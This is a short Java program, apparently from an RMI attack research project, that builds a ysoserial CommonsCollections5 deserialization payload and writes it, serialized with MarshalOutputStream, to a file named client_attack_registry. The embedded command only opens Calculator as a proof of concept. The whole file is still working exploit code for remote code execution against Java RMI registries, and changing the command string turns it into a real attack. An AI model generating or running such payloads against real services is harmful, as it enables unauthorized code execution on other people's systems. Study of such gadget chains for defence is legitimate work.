package com.wu.attackRmi.utils;

import sun.rmi.server.MarshalOutputStream;
import ysoserial.payloads.CommonsCollections5;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class GenSerialization {
    public static void main(String[] args) throws Exception {
        Object payload = new CommonsCollections5().getObject("open /System/Applications/Calculator.app");
        ObjectOutputStream os = new MarshalOutputStream(new FileOutputStream("/tmp/client_attack_registry"));
        String name = "hello";
//        os.writeObject(name);
        os.writeObject(payload);
        os.close();
    }
}
